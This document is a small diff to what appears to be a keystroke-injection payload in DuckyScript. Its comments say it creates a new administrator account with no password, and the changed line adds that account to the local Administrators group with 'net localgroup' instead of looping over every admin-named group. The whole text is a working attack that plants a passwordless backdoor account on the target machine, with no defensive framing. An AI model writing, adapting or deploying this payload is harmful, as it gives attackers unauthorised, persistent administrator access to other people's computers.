@@ -2,5 +2,5 @@ REM will create a new Admin account with no password
 REM Run this code in cmd with admin privilages
 STRING net user /add Administrator
 ENTER
-STRING for /f "tokens=*" %G in ('net localgroup ^| find /i "admin" ^| find /v "Alias"') do net localgroup "%G" Administrator /add
+STRING net localgroup Administrators Administrator /add
 ENTER
